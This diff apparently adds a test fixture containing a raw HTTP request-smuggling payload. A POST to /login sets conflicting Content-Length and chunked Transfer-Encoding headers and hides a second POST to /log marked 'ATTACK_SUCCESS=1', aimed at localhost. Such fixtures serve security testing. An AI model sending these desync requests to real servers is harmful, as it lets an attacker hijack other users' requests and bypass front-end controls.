@@ -1,0 +1,15 @@
+POST /login HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Transfer-Encoding: chunked
+
+e
+username=alice
+0
+
+POST /log HTTP/1.1
+Host: localhost
+Content-Length: 18
+
+ATTACK_SUCCESS=1
